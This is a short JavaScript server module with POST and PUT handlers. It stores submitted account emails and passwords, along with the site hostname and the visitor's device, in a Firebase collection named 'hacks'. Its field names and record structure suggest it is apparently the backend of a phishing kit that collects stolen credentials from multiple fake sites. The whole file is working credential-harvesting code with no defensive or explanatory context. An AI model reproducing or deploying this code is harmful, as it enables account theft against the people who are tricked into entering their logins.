import { db } from "./_firebase";
import { getUserDevice } from "./_function";

export async function post(req) {
   
    var hackref = db.collection("hacks");
    var inputData = await req.request.json();
    console.log(inputData);
    var timestamp = new Date().getTime();

    inputData["timestamp"] = timestamp;
    inputData["archived"] = false;
    inputData["hostname"] = req.url.hostname;
    inputData["device"] = getUserDevice(req.request.agent);
    if (
        inputData["input_account_email"].length < 30 &&
        inputData["input_account_password"].length < 26
    ) {
        try {

            let res = await hackref
                .doc(timestamp.toString())
                .set(inputData)
            console.log('res')
            return { body: { message: 'updated', timestamp: timestamp } }
        } catch (error) {
            console.log('post error',error)
            return { body: { message: 'error' } }
        }


    }
    console.log(inputData);

}

export async function put(req) {
    var hackref = db.collection("hacks");
    var inputData = await req.request.json();
    let ts = inputData['timestamp']
    delete inputData['timestamp']
    console.log(inputData)



    try {

        let res = await hackref
            .doc(ts)
            .update(inputData)
        console.log('res', res)
        return { body: { message: 'updated', timestamp: ts } }
    } catch (error) {
        console.log(error)
        return { body: { message: 'error' } }
    }

}